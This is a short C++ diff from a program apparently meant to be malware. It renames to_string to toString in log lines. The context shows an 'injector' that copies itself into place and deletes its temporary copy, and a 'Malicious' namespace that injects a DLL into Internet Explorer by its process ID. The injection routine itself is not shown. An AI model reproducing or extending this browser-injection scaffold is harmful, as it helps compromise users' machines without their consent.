@@ -32,7 +32,7 @@ namespace Inhibiter
         // par défaut, si il existe déja un exécutale de l'injecteur, celui-ci est directement remplacé.
         if(CopyFile(current_executable_path.c_str(), executable_path.c_str(), FALSE) == FALSE)
         {
-            LOG << "CopyFile failed : " + to_string(GetLastError());
+            LOG << "CopyFile failed : " + toString(GetLastError());
             FATAL_ERROR("Unable to install injector");
         }
 
@@ -61,7 +61,7 @@ namespace Inhibiter
         LOG << "Temporary exe, deleting injector";
         if(!DeleteFile(executable_path.c_str()))
         {
-            LOG << "DeleteFile failed : " + to_string(GetLastError());
+            LOG << "DeleteFile failed : " + toString(GetLastError());
             FATAL_ERROR("Unable to delete injector");
         }
     }
@@ -107,7 +107,7 @@ namespace Inhibiter
         }
 
 		Malicious::InternetExplorer ie;
-		LOG << "Injecting IE with PID : " + to_string(ie.getPid());
+		LOG << "Injecting IE with PID : " + toString(ie.getPid());
 
 		if(!Malicious::inject(ie.getPid(), dll_path))
         {
